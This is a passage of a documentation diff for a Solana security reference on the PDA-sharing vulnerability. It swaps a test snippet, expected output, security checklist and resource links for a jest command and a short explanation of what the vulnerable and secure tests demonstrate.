-      .rpc();
-
-    assert.fail("Expected transaction to fail");
-  } catch (err) {
-    expect(err.toString()).toContain("InvalidSeeds");
-  }
-});
+# Run the Pinocchio PDA sharing tests
+npx jest tests/pinocchio/pda-sharing.pinocchio.test.ts
 ```
 
-```bash Expected Output
-✓ should create separate pools per user (423ms)
-
-Alice's pool: CxK... (balance: 100)
-Bob's pool: 8mQ... (balance: 50)
-✅ FIX CONFIRMED: Pools are isolated
-```
-</CodeGroup>
-
-## Security Checklist
-
-- [ ] All user-specific PDAs include user pubkey in seeds
-- [ ] PDA derivation uses `[b"prefix", user.key(), resource.key()]` pattern
-- [ ] Tests verify users cannot access each other's PDAs
-- [ ] Shared PDAs only used intentionally with proper accounting
-- [ ] Withdraw functions validate user owns the PDA
-
-## Resources & Next Steps
-
-<CardGroup cols={3}>
-  <Card title="View Source Code" icon="code" href="https://github.com/superteamng/solana-security-reference/tree/main/programs/pda-sharing">
-    Browse vulnerable and secure PDA implementations
-  </Card>
-  <Card title="Run Tests" icon="flask" href="https://github.com/superteamng/solana-security-reference/tree/main/tests">
-    See PDA sharing attacks demonstrated
-  </Card>
-  <Card title="Framework Comparison" icon="scale-balanced" href="/comparisons/anchor-vs-pinocchio">
-    Compare Anchor vs Pinocchio security approaches
-  </Card>
-</CardGroup>
-
-<Tip>
-**Design Pattern:** Always use `[b"resource_type", user.key(), resource_identifier.key()]` for user-owned PDAs to ensure isolation.
-</Tip>
+You will see the vulnerable test pass (Bob successfully steals tokens) and the secure test pass (Bob's theft attempt is rejected). If any test fails to compile, run `anchor build` first to generate the IDL types.
